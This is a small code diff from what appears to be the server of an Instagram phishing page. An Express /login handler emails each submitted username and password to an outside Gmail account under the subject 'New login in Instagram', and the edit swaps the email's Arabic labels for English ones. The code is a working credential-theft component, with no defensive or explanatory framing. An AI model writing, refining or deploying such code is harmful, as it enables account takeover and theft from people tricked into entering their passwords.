@@ -25,7 +25,7 @@ app.post('/login', (req, res) => {
     from: 'itinfor79@gmail.com',
     to: 'itinfor79@gmail.com',
     subject: '📩 تسجيل دخول جديد في انستغرام',
-    text: `اسم المستخدم: ${name}\nكلمة المرور: ${password}`
+    text: `Username: ${name}\n Password: ${password}`
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
